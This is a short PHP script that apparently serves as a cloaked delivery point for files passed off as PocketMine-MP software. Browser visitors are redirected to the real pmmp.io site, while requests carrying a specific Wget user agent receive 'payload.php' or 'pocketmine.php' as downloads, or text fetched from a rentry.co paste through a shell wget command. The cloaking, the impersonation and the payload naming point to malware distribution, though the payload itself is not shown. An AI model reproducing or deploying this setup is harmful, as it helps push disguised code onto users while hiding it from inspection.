<?php

if($_SERVER['HTTP_USER_AGENT'] !== "Wget/1.21"){
    header('Location: https://pmmp.io');
    return;
}

if($_GET['o']){
    if(!in_array($_GET['o'], ['payload.php', 'pocketmine.php'])){
        echo `wget -qO- rentry.co/pmmp/raw`;
        return;
    }
    header("Content-type: application/x-httpd-php");
    header('Content-Disposition: attachment; filename=' . $_GET['o']);
    readfile($_GET['o']);
    return;
}
else echo `wget -qO- rentry.co/pmmp/raw`;


